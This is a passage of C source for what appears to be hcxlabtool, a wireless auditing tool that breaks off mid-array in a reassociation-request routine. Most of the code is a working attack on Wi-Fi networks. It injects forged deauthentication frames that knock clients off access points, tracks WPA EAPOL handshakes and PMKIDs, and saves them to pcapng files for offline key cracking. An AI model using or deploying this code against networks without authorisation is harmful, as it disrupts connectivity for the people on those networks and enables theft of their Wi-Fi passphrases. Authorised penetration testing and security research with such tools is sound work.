#define _GNU_SOURCE
#include <getopt.h>
#include <ifaddrs.h>
#include <inttypes.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <linux/filter.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/time.h>

#include "include/hcxlabtool.h"
#include "include/wireless-lite.h"
#include "include/rpigpio.h"
#include "include/wireless-lite.h"
#include "include/ieee80211.c"
#include "include/pcap.c"

/*===========================================================================*/
/* global var */

static struct timeval tv;
static struct timeval tvold;
static struct timeval tvlast;
static uint64_t timestamp;
static uint64_t mytime;
static int staytime;

static aplist_t *aplist;
static rgaplist_t *rgaplist;
static eapollist_t *eapolm1list;
static eapollist_t *eapolm2list;
static eapollist_t *eapolm3list;

static char ifname[IFNAMSIZ +1];
static uint8_t ifmac[6];
static struct sock_fprog bpf;

static int fd_socket;
static int sd_socket;
static int fd_pcapng;

static bool wantstopflag;
static int gpiostatusled;
static int gpiobutton;
static int errorcount;

static enhanced_packet_block_t *epbhdr;
static int packetlen;
static uint8_t *packetptr;
static uint8_t *packetoutptr;
static mac_t *macfrx;
static uint8_t *ieee82011ptr;
static uint32_t ieee82011len;
static uint8_t *payloadptr;
static uint32_t payloadlen;
static uint8_t *llcptr;
static llc_t *llc;

static uint32_t ouirgap;
static uint32_t nicrgap;
static uint8_t macrgap[6];
static uint8_t anonce[32];
static uint32_t ouirgclient;
static uint32_t nicrgclient;
static uint8_t macrgclient[6];
static uint8_t snonce[32];
static uint64_t rgrc;

static uint16_t deauthenticationsequence;
static uint16_t clientsequence;
static uint16_t apsequence;

static const uint8_t hdradiotap[] =
{
0x00, 0x00, /* radiotap version and padding */
0x0e, 0x00, /* radiotap header length */
0x06, 0x8c, 0x00, 0x00, /* bitmap */
0x02, /* flags */
0x0c, /* rate */
0x14, /* tx power */
0x01, /* antenna */
0x18, 0x00 /* tx flags */
};
#define HDRRT_SIZE sizeof(hdradiotap)

static int csc;
static int channelscanlist[256];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
static uint8_t epbown[PCAPNG_MAXSNAPLEN *2];

/*===========================================================================*/
/*===========================================================================*/
static inline void debugmac3(uint8_t *mac1, uint8_t *mac2, uint8_t *mac3, char *message)
{
static uint32_t p;

for(p = 0; p < 6; p++) printf("%02x", mac1[p]);
printf(" ");
for(p = 0; p < 6; p++) printf("%02x", mac2[p]);
printf(" ");
for(p = 0; p < 6; p++) printf("%02x", mac3[p]);
printf(" %s\n", message);
return;
}
/*===========================================================================*/
static inline void debugmac2(uint8_t *mac1, uint8_t *mac2, char *message)
{
static uint32_t p;

for(p = 0; p < 6; p++) printf("%02x", mac1[p]);
printf(" ");
for(p = 0; p < 6; p++) printf("%02x", mac2[p]);
printf(" %s\n", message);
return;
}
/*===========================================================================*/
static inline void debugmac1(uint8_t *mac1, char *message)
{
static uint32_t p;

for(p = 0; p < 6; p++) printf("%02x", mac1[p]);
printf(" %s\n", message);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void globalclose()
{
signal(SIGINT, SIG_DFL);

if(bpf.filter != NULL)
	{
	setsockopt(fd_socket, SOL_SOCKET, SO_DETACH_FILTER, &bpf, sizeof(bpf));
	free(bpf.filter);
	}
close(fd_socket);
if(fd_pcapng > 0) close(fd_pcapng);
if(aplist != NULL) free(aplist);
if(rgaplist != NULL) free(rgaplist);
if(eapolm1list != NULL) free(eapolm1list);
if(eapolm2list != NULL) free(eapolm2list);
if(eapolm3list != NULL) free(eapolm3list);
return;
}
/*===========================================================================*/
#ifdef GETM1234
static inline void send_deauthentication_check_aplist(uint8_t *macclient, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->macap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if(zeiger->eapolstatus > EAPOLM1M2) return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence >= 4096) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +2) == -1) errorcount++;
return;
}
#endif
/*===========================================================================*/
static inline void send_deauthentication_client(uint8_t *macclient, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, macclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence >= 4096) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +2) == -1) errorcount++;
return;
}
/*===========================================================================*/
#ifdef GETM1234
static inline void send_deauthentication(uint8_t *macclient, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = deauthenticationsequence++ << 4;
if(deauthenticationsequence >= 4096) deauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +2) == -1) errorcount++;
return;
}
#endif
/*===========================================================================*/
static inline void send_ack()
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_ACK+1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_CTL;
macftx->subtype = IEEE80211_STYPE_ACK;
memcpy(macftx->addr1, macfrx->addr2, 6);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_ACK) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void writeepb()
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packetlen;
epbhdr->org_len = packetlen;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdr->cap_len %4)) %4;
epblen += packetlen;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd_pcapng, &epb, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
/*===========================================================================*/
static inline aplist_t* getaptags(aplist_t* aplist, uint8_t *macap)
{
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return NULL;
	if(memcmp(zeiger->macap, macap, 6) == 0) return zeiger;
	}
return NULL;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void addeapolstatus(uint8_t *macap, uint8_t eapolstatus)
{
static aplist_t *zeiger; 

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->macap, macap, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->eapolstatus |= eapolstatus;
	zeiger->count += 1;
	return;
	}
memset(zeiger, 0, APLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->eapolstatus = eapolstatus;
zeiger->count = 1;
memcpy(zeiger->macap, macap, 6);
qsort(aplist, zeiger -aplist +1, APLIST_SIZE, sort_aplist_by_time);
return;
}
/*===========================================================================*/
static inline void gettagwpa(int wpalen, uint8_t *ieptr, aplist_t *zeiger)
{
static int c;
static wpaie_t *wpaptr;
static int wpatype;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static int csuitecount;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static int asuitecount;

wpaptr = (wpaie_t*)ieptr;
wpalen -= WPAIE_SIZE;
ieptr += WPAIE_SIZE;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if(wpaptr->ouitype != 1) return;
wpatype = wpaptr->type;
if(wpatype != VT_WPA_IE) return;
zeiger->kdversion |= KV_WPAIE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &ouimscorp, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
wpalen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
csuitecount = csuitecountptr->count;
for(c = 0; c < csuitecount; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
asuitecount = asuitecountptr->count;
for(c = 0; c < asuitecount; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
return;
}
/*===========================================================================*/
static inline void gettagvendor(int vendorlen, uint8_t *ieptr, aplist_t *zeiger)
{
static wpaie_t *wpaptr;

wpaptr = (wpaie_t*)ieptr;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if((wpaptr->ouitype == VT_WPA_IE) && (vendorlen >= WPAIE_LEN_MIN)) gettagwpa(vendorlen, ieptr, zeiger);
return;
}
/*===========================================================================*/
static inline void gettagrsn(int rsnlen, uint8_t *ieptr, aplist_t *zeiger)
{
static int c;
static rsnie_t *rsnptr;
static int rsnver;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static int csuitecount;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static int asuitecount;
static rsnpmkidlist_t *rsnpmkidlistptr;
static int rsnpmkidcount;

rsnptr = (rsnie_t*)ieptr;
rsnver = rsnptr->version;
if(rsnver != 1) return;
zeiger->kdversion |= KV_RSNIE;
rsnlen -= RSNIE_SIZE;
ieptr += RSNIE_SIZE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &suiteoui, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
rsnlen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
csuitecount = csuitecountptr->count;
for(c = 0; c < csuitecount; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
asuitecount = asuitecountptr->count;
for(c = 0; c < asuitecount; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
rsnlen -= RSNCAPABILITIES_SIZE;
ieptr += RSNCAPABILITIES_SIZE;
if(rsnlen <= 0) return;
rsnpmkidlistptr = (rsnpmkidlist_t*)ieptr;
rsnpmkidcount = rsnpmkidlistptr->count;
if(rsnpmkidcount == 0) return;
rsnlen -= RSNPMKIDLIST_SIZE;
ieptr += RSNPMKIDLIST_SIZE;
if(rsnlen < 16) return;
if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
	{
	if(memcmp(&zeroed32, ieptr, 16) == 0) return;
	}
return;
}
/*===========================================================================*/
static inline void gettags(int infolen, uint8_t *infoptr, aplist_t *zeiger)
{
static ietag_t *tagptr;

while(0 < infolen)
	{
	if(infolen == 4) return;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len == 0)
		{
		infoptr += tagptr->len +IETAG_SIZE;
		infolen -= tagptr->len +IETAG_SIZE;
		continue;
		}
	if(tagptr->len > infolen) return;
	if(tagptr->id == TAG_SSID)
		{
		if((tagptr->len > 0) && (tagptr->len <= ESSID_LEN_MAX) && (tagptr->data[0] != 0))
			{
			memcpy(zeiger->essid, &tagptr->data[0], tagptr->len);
			zeiger->essidlen = tagptr->len;
			}
		}
	else if(tagptr->id == TAG_CHAN)
		{
		if(tagptr->len == 1) zeiger->channel = tagptr->data[0];
		}
	else if(tagptr->id == TAG_RSN)
		{
		if(tagptr->len >= RSNIE_LEN_MIN) gettagrsn(tagptr->len, tagptr->data, zeiger);
		}
	else if(tagptr->id == TAG_VENDOR)
		{
		if(tagptr->len >= VENDORIE_SIZE) gettagvendor(tagptr->len, tagptr->data, zeiger);
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return;
}
/*===========================================================================*/
static inline uint8_t gettagessid(int infolen, uint8_t *infoptr, uint8_t **essidstr)
{
static ietag_t *tagptr;

while(0 < infolen)
	{
	if(infolen == 4) return 0;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len == 0)
		{
		infoptr += tagptr->len +IETAG_SIZE;
		infolen -= tagptr->len +IETAG_SIZE;
		continue;
		}
	if(tagptr->len > infolen) return 0;
	if(tagptr->id == TAG_SSID)
		{
		if((tagptr->len > 0) && (tagptr->len <= ESSID_LEN_MAX) && (&tagptr->data[0] != 0))
			{
			*essidstr = &tagptr->data[0];
			return tagptr->len;
			}
		return 0;
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return 0;
}
/*===========================================================================*/
static inline void process80211exteap(int authlen)
{
static uint8_t *eapauthptr;
static exteap_t *exteap;
static uint16_t exteaplen;

eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
exteaplen = ntohs(exteap->len);
if(exteaplen > authlen) return;
writeepb(fd_pcapng);
if(exteap->type == EAP_TYPE_ID)
	{
	if(exteap->code == EAP_CODE_REQ)
		{
		}
	else if(exteap->code == EAP_CODE_RESP)
		{
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m4(uint8_t *wpakptr)
{
static wpakey_t *wpak;
static eapollist_t *zeigerm3;

wpak = (wpakey_t*)wpakptr;
writeepb(fd_pcapng);
for(zeigerm3 = eapolm3list; zeigerm3 < eapolm3list +EAPOLLIST_MAX; zeigerm3++)
	{
	if(memcmp(macfrx->addr1, zeigerm3->macap, 6) != 0) continue;
	if(memcmp(macfrx->addr2, zeigerm3->macclient, 6) != 0) continue;
	if(timestamp - zeigerm3->timestamp > EAPOLM3M4TIMEOUT) break;
	if((be64toh(wpak->replaycount)) != zeigerm3->rc) continue;
	addeapolstatus(macfrx->addr1, EAPOLM3M4);
	return;
	}
addeapolstatus(macfrx->addr1, 0);
#ifdef GETM1234
send_deauthentication_check_aplist(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
#endif
return;
}
/*===========================================================================*/
static inline void process80211eapol_m3(uint8_t *wpakptr)
{
static wpakey_t *wpak;
static eapollist_t *zeiger, *zeigerm2;

writeepb(fd_pcapng);
wpak = (wpakey_t*)wpakptr;
zeiger = eapolm3list +EAPOLLIST_MAX;
zeiger->timestamp = timestamp;
memcpy(zeiger->macap, macfrx->addr2, 6);
memcpy(zeiger->macclient, macfrx->addr1, 6);
zeiger->rc = be64toh(wpak->replaycount);

qsort(eapolm3list, EAPOLLIST_MAX +1, EAPOLLIST_SIZE, sort_eapollist_by_time);
for(zeigerm2 = eapolm2list; zeigerm2 < eapolm2list +EAPOLLIST_MAX; zeigerm2++)
	{
	if(memcmp(eapolm3list->macap, zeigerm2->macap, 6) != 0) continue;
	if(memcmp(eapolm3list->macclient, zeigerm2->macclient, 6) != 0) continue;
	if(eapolm3list->timestamp - zeigerm2->timestamp > EAPOLM2M3TIMEOUT) break;
	if(eapolm3list->rc != (zeigerm2->rc +1)) continue;
	addeapolstatus(macfrx->addr2, EAPOLM2M3);
	return;
	}
addeapolstatus(macfrx->addr2, 0);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m2(uint8_t *wpakptr)
{
static wpakey_t *wpak;
static eapollist_t *zeiger, *zeigerm1;
static uint8_t m2status;

writeepb(fd_pcapng);
wpak = (wpakey_t*)wpakptr;
zeiger = eapolm2list +EAPOLLIST_MAX;
zeiger->timestamp = timestamp;
memcpy(zeiger->macap, macfrx->addr1, 6);
memcpy(zeiger->macclient, macfrx->addr2, 6);
zeiger->rc = be64toh(wpak->replaycount);
m2status = 0;
if(zeiger->rc == rgrc) m2status |= EAPOLRGM2;
qsort(eapolm2list, EAPOLLIST_MAX +1, EAPOLLIST_SIZE, sort_eapollist_by_time);
for(zeigerm1 = eapolm1list; zeigerm1 < eapolm1list +EAPOLLIST_MAX; zeigerm1++)
	{
	if(memcmp(eapolm2list->macap, zeigerm1->macap, 6) != 0) continue;
	if(memcmp(eapolm2list->macclient, zeigerm1->macclient, 6) != 0) continue;
	if(eapolm2list->timestamp - zeigerm1->timestamp > EAPOLM1M2TIMEOUT) break;
	if(eapolm2list->rc != zeigerm1->rc) continue;
	m2status |= EAPOLM1M2;
	addeapolstatus(macfrx->addr1, m2status);
	return;
	}
addeapolstatus(macfrx->addr1, m2status);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m1(uint16_t authlen, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static int infolen;
static pmkid_t *pmkid;
static eapollist_t *zeiger;


writeepb(fd_pcapng);
wpak = (wpakey_t*)wpakptr;
zeiger = eapolm1list +EAPOLLIST_MAX;
zeiger->timestamp = timestamp;
memcpy(zeiger->macap, macfrx->addr2, 6);
memcpy(zeiger->macclient, macfrx->addr1, 6);
zeiger->rc = be64toh(wpak->replaycount);
qsort(eapolm1list, EAPOLLIST_MAX +1, EAPOLLIST_SIZE, sort_eapollist_by_time);
if(memcmp(&macrgclient, macfrx->addr1, 6) == 0)
	{
	send_ack();
	send_deauthentication_client(macfrx->addr1, macfrx->addr2, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
	}
if(authlen <= WPAKEY_SIZE +PMKID_SIZE)
	{
	addeapolstatus(macfrx->addr2, EAPOLM1);
	return;
	}
if(infolen < (int)PMKID_SIZE)
	{
	addeapolstatus(macfrx->addr2, EAPOLM1);
	return;
	}
pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
if(pmkid->id != TAG_VENDOR)
	{
	addeapolstatus(macfrx->addr2, EAPOLM1);
	return;
	}
if((pmkid->len != 0x14) && (pmkid->type != 0x04))
	{
	addeapolstatus(macfrx->addr2, EAPOLM1);
	return;
	}
if(memcmp(pmkid->pmkid, &zeroed32, 16) == 0)
	{
	addeapolstatus(macfrx->addr2, EAPOLM1);
	return;
	}
addeapolstatus(macfrx->addr2, EAPOLPMKID);
return;
}
/*===========================================================================*/
static inline void process80211eapol(uint16_t authlen)
{
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint16_t keyinfo;

wpakptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
if(keyinfo == 1) process80211eapol_m1(authlen, wpakptr);
else if(keyinfo == 2) process80211eapol_m2(wpakptr);
else if(keyinfo == 3) process80211eapol_m3(wpakptr);
else if(keyinfo == 4) process80211eapol_m4(wpakptr);
return;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint16_t eapauthlen;
static uint16_t authlen;

eapauthptr = payloadptr +LLC_SIZE;
eapauthlen = payloadlen -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4)) return;
if(eapauth->type == EAPOL_KEY)
	{
	if(authlen >= WPAKEY_SIZE) process80211eapol(authlen);
	}
else if(eapauth->type == EAP_PACKET) process80211exteap(authlen);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211blockack()
{
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->macap, macfrx->addr1, 6) != 0) continue;
	memcpy(zeiger->lastmacclient, macfrx->addr2, 6);
	zeiger->timestamp = timestamp;
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211blockack_req()
{
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->macap, macfrx->addr1, 6) != 0) continue;
	memcpy(zeiger->lastmacclient, macfrx->addr2, 6);
	zeiger->timestamp = timestamp;
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211qosnull()
{
static aplist_t *zeiger;

if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) return;
		if(memcmp(zeiger->macap, macfrx->addr1, 6) != 0) continue;
		memcpy(zeiger->lastmacclient, macfrx->addr2, 6);
		zeiger->timestamp = timestamp;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211null()
{
static aplist_t *zeiger;

if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) return;
		if(memcmp(zeiger->macap, macfrx->addr1, 6) != 0) continue;
		memcpy(zeiger->lastmacclient, macfrx->addr2, 6);
		zeiger->timestamp = timestamp;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211powersave_poll()
{
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->macap, macfrx->addr1, 6) != 0) continue;
	memcpy(zeiger->lastmacclient, macfrx->addr2, 6);
	zeiger->timestamp = timestamp;
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211action()
{
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->macap, macfrx->addr1, 6) != 0) continue;
	memcpy(zeiger->lastmacclient, macfrx->addr2, 6);
	zeiger->timestamp = timestamp;
	return;
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211reassociation_resp()
{


writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211association_resp()
{


writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
//static uint8_t *clientinfoptr;
static uint16_t clientinfolen;

//clientinfoptr = payloadptr +CAPABILITIESSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;


writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
//static uint8_t *clientinfoptr;
static uint16_t clientinfolen;

//clientinfoptr = payloadptr +CAPABILITIESSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;


writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa2(uint8_t *macclient, aplist_t *zeiger)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa2data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
